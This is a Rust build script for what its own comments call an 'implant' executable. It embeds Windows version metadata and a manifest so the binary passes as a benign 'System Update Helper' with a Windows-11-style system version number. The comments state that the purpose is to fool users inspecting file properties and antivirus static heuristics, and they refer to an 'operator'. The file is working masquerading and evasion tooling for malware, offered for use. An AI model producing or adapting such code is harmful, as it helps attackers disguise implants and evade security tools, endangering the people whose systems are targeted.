//! Build script: embed a Windows version resource + application manifest into
//! the implant exe so its PE metadata looks like an ordinary application
//! (FileDescription, ProductName, CompanyName, FileVersion, …) rather than a
//! stripped, metadata-less binary. A manifest also requests `asInvoker` and
//! common controls — what a legit GUI/system utility ships with.
//!
//! Uses the `winres` crate, which shells out to `rc.exe` (shipped with the MSVC
//! toolchain that already builds this workspace). If `rc.exe` can't be located
//! the build does NOT abort — the exe still compiles, just without the resource.

fn main() {
    if std::env::var("CARGO_CFG_WINDOWS").is_ok() {
        let mut res = winres::WindowsResource::new();
        // Benign, application-like identity. These populate the PE VERSIONINFO
        // (what `right-click → Properties → Details` and AV static heuristics
        // read). Deliberately generic — a "system update helper".
        res.set("FileDescription", "System Update Helper");
        res.set("ProductName", "System Update Helper");
        res.set("CompanyName", "System Update Helper Project");
        res.set("LegalCopyright", "© 2026 System Update Helper Project. All rights reserved.");
        res.set("OriginalFilename", "updatehelper.exe");
        res.set("InternalName", "updatehelper");
        res.set("Comments", "Applies periodic system maintenance and compatibility updates.");
        // Version stamp (matches the manifest + resource). 10.0.22621.0 reads
        // as a Windows-11-era system component.
        res.set("FileVersion", "10.0.22621.0");
        res.set("ProductVersion", "10.0.22621.0");
        // Embed an application manifest (asInvoker + common controls + DPI).
        res.set_manifest(include_str!("updatehelper.manifest"));
        if let Err(e) = res.compile() {
            // Don't fail the build if rc.exe isn't available — the exe still
            // works, just without the version resource. Print a warning so the
            // operator knows the metadata wasn't embedded.
            println!("cargo:warning=winres: could not compile version resource (rc.exe missing?): {e}");
        }
    }
    // Rebuild if the manifest changes.
    println!("cargo:rerun-if-changed=updatehelper.manifest");
    println!("cargo:rerun-if-changed=build.rs");
}
